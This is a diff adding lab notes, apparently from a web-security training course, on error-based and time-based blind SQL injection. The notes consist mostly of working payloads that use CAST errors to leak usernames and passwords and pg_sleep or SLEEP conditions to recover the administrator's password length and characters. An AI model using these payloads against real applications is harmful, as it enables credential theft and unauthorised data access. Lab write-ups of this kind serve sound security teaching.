@@ -1,0 +1,87 @@
+SQL Injection — Error-Based (Visible Errors)
+Overview
+
+In this lab, the application directly displays SQL error messages in its HTTP responses.
+This behavior allows extracting data by forcing type conversion errors.
+
+Forcing SQL Errors with CAST
+' OR CAST((SELECT 1) AS int)-- -
+
+
+This confirms that:
+
+The SQL query is injectable
+
+Database errors are reflected in the response
+
+Extracting Usernames
+' OR 1 = CAST((SELECT username FROM users) AS int)-- -
+
+
+Returned error:
+
+more than one row returned by a subquery used as an expression
+
+
+This indicates multiple rows exist in the users table.
+
+Limiting Results
+' OR 1 = CAST((SELECT username
+FROM users
+LIMIT 1) AS int)-- -
+
+
+The error message now includes the extracted username.
+
+Extracting Passwords
+' OR 1 = CAST((SELECT password
+FROM users
+LIMIT 1) AS int)-- -
+
+
+The password is disclosed directly in the error message.
+
+Conclusion
+
+When SQL errors are visible, sensitive data can often be extracted without blind techniques.
+
+Blind SQL Injection — Time-Based
+Overview
+
+This lab demonstrates a Time-Based Blind SQL Injection where information is inferred by measuring server response delays.
+
+Delay Functions
+
+MySQL:
+
+AND SLEEP(10)
+
+
+PostgreSQL:
+
+|| pg_sleep(10)-- -
+
+Character-Based Extraction
+'; SELECT CASE
+WHEN (username='administrator'
+AND SUBSTRING(password,1,1)='9')
+THEN pg_sleep(3)
+ELSE pg_sleep(0)
+END
+FROM users-- -
+
+
+A delayed response indicates a true condition.
+
+Password Length Discovery
+'; SELECT CASE
+WHEN (username='administrator'
+AND LENGTH(password)=20)
+THEN pg_sleep(3)
+ELSE pg_sleep(0)
+END
+FROM users-- -
+
+Conclusion
+
+Response timing differences provide a reliable channel to extract sensitive data when no output or errors are visible.
